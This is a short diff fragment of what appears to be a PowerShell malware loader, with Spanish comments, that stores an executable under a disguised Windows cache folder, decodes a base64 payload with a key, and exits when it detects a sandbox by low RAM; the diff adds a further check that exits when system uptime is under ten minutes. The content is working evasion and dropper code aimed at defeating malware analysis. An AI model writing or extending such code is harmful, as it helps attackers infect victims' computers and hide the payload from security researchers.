@@ -66,6 +66,9 @@ $o="$env:APPDATA\\Microsoft\\Windows\\Caches\\{random_name}.exe"
 # Anti-Sandbox: Verificar RAM
 if((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB){{exit}}
 
+# Anti-Sandbox: Verificar uptime
+if((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime -lt [TimeSpan]::FromMinutes(10)){{exit}}
+
 # Decodificar payload
 $b=[Convert]::FromBase64String($p)
 $kb=[Text.Encoding]::UTF8.GetBytes($k)
